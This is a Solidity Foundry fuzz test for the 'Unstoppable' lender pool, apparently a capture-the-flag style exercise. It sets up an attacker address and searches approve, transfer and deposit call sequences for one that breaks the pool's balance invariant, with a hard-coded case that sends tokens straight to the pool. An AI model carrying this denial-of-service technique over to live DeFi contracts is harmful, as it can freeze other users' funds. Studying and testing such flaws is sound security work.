// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "@utils/ERC20Basic.sol";

import "examples/Unstoppable/Receiver.sol";
import "examples/Unstoppable/LenderPool.sol";

contract UnstoppableFuzzing is Test {
    address owner;
    address attacker;
    ERC20Basic token;
    LenderPool pool;
    Receiver receiver;

    uint256 public attackerInitBalance = 1 gwei;
    uint256 public attackerInitToken = 10000;
    uint256 public poolInitToken = 100 * attackerInitToken;

    function setUp() public {
        owner = address(this);
        attacker = address(0xdeadbeef);
        vm.deal(attacker, attackerInitBalance);

        token = new ERC20Basic(1000 ether);
        pool = new LenderPool(address(token));
        receiver = new Receiver(address(pool), address(token));

        token.transfer(attacker, attackerInitToken);
        token.transfer(attacker, attackerInitToken);
    }

    function addressSelector(uint256 e) public returns (address) {
        address[5] memory addresses = [
            address(0),
            attacker,
            address(token),
            address(pool),
            address(receiver)
        ];
        e = bound(e, 0, addresses.length - 1);
        return addresses[e];
    }

    function testAttackGT() public {
        testAttack(3, 1, 3, 1, 1);
    }

    function testAttack(
        uint256 e0,
        uint256 v0,
        uint256 e1,
        uint256 v1,
        uint256 v2
    ) public {
        address a0 = addressSelector(e0);
        address a1 = addressSelector(e1);
        bool succeed;
        bytes memory call_data;
        vm.startPrank(attacker);

        call_data = abi.encodeWithSignature("approve(address,uint256)", a0, v0);
        (succeed, ) = address(token).call(call_data);
        if (succeed) {
            call_data = abi.encodeWithSignature("transfer(address,uint256)", a1, v1);
            (succeed, ) = address(token).call(call_data);
            if (succeed) {
                call_data = abi.encodeWithSignature("depositTokens(uint256)", v2);
                (succeed, ) = address(pool).call(call_data);
                if (succeed) {
                    emit log_named_uint("LenderPool.poolBalance: ", pool.poolBalance());
                    emit log_named_uint("LenderPool.allDepositsBalance: ", pool.allDepositsBalance());
                    assert(pool.poolBalance() == pool.allDepositsBalance());
                }
            }
        }
        vm.stopPrank();
    }
}
